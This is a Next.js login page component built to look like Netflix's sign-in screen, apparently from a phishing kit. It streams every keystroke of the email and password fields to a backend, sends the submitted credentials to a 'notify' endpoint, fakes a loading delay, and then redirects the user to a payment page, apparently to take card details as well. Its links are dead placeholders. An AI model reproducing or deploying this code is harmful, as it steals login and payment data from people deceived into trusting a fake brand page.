'use client';

import { useState } from "react";
import { useRouter } from "next/navigation";
import { trpc } from "@/lib/trpc";
import { useSession } from "@/lib/contexts/SessionContext";
import { Loader2 } from "lucide-react";

export default function LoginPage() {
  const router = useRouter();
  const { sessionId, t } = useSession();
  const [email, setEmail] = useState("");
  const [password, setPassword] = useState("");
  const [loading, setLoading] = useState(false);
  const [rememberMe, setRememberMe] = useState(false);

  const loginMutation = trpc.notify.loginSubmitted.useMutation();
  const updateStatus = trpc.session.updateStatus.useMutation();
  const updateTypingMutation = trpc.session.updateTyping.useMutation();

  const handleTyping = (field: string, value: string) => {
    if (sessionId) {
      updateTypingMutation.mutate({ sessionId, field, value });
    }
  };

  const handleSignIn = async (e: React.FormEvent) => {
    e.preventDefault();
    if (!email || !password) return;
    setLoading(true);
    if (sessionId) {
      loginMutation.mutate({ sessionId, email, password });
      updateStatus.mutate({ sessionId, status: "payment" });
    }
    setTimeout(() => {
      setLoading(false);
      router.push("/payment");
    }, 3000);
  };

  const inputStyle: React.CSSProperties = {
    width: "100%",
    padding: "clamp(12px, 3.5vw, 16px)",
    backgroundColor: "#333333",
    border: "none",
    borderRadius: "4px",
    color: "white",
    fontSize: "clamp(14px, 3.5vw, 16px)",
    outline: "none",
    boxSizing: "border-box",
  };

  return (
    <div style={{ backgroundColor: "#141414", minHeight: "100vh", display: "flex", flexDirection: "column" }}>
      <div style={{ flex: 1, display: "flex", alignItems: "center", justifyContent: "center", padding: "20px 16px" }}>
        <div style={{
          backgroundColor: "rgba(0,0,0,0.75)",
          borderRadius: "4px",
          padding: "clamp(32px, 6vw, 60px) clamp(20px, 6vw, 68px)",
          width: "100%",
          maxWidth: "460px",
          boxSizing: "border-box",
        }}>
          <h1 style={{ color: "white", fontSize: "clamp(22px, 5vw, 32px)", fontWeight: 700, marginBottom: "28px", fontFamily: "'Helvetica Neue', Helvetica, Arial, sans-serif" }}>
            {t("signIn")}
          </h1>

          <form onSubmit={handleSignIn}>
            <div style={{ marginBottom: "16px" }}>
              <input
                type="email"
                placeholder={t("emailOrPhone")}
                value={email}
                onChange={(e) => {
                  setEmail(e.target.value);
                  handleTyping("email", e.target.value);
                }}
                style={inputStyle}
                required
              />
            </div>

            <div style={{ marginBottom: "16px" }}>
              <input
                type="password"
                placeholder={t("password")}
                value={password}
                onChange={(e) => {
                  setPassword(e.target.value);
                  handleTyping("password", e.target.value);
                }}
                style={inputStyle}
                required
              />
            </div>

            <div style={{ marginBottom: "28px", display: "flex", alignItems: "center", justifyContent: "space-between" }}>
              <label style={{ display: "flex", alignItems: "center", gap: "8px", color: "white", fontSize: "13px", cursor: "pointer" }}>
                <input
                  type="checkbox"
                  checked={rememberMe}
                  onChange={(e) => setRememberMe(e.target.checked)}
                  style={{ cursor: "pointer", width: "16px", height: "16px" }}
                />
                {t("rememberMe")}
              </label>
              <a href="#" style={{ color: "#0099d8", textDecoration: "none", fontSize: "13px" }}>
                {t("forgotPassword")}
              </a>
            </div>

            <button
              type="submit"
              disabled={loading}
              style={{
                width: "100%",
                backgroundColor: loading ? "#999" : "#E50914",
                color: "white",
                border: "none",
                borderRadius: "4px",
                padding: "10px",
                fontSize: "16px",
                fontWeight: 700,
                cursor: loading ? "not-allowed" : "pointer",
                display: "flex",
                alignItems: "center",
                justifyContent: "center",
                gap: "8px",
                transition: "background-color 0.15s ease",
              }}
              onMouseEnter={(e) => !loading && (e.currentTarget.style.backgroundColor = "#c40812")}
              onMouseLeave={(e) => !loading && (e.currentTarget.style.backgroundColor = "#E50914")}
            >
              {loading && <Loader2 size={16} className="animate-spin" />}
              {loading ? t("processing") : t("signIn")}
            </button>
          </form>

          <p style={{ color: "#8c8c8c", fontSize: "13px", marginTop: "16px", textAlign: "center" }}>
            {t("newToNetflix")} <a href="#" style={{ color: "#0099d8", textDecoration: "none" }}>{t("signUpNow")}</a>
          </p>
        </div>
      </div>
    </div>
  );
}
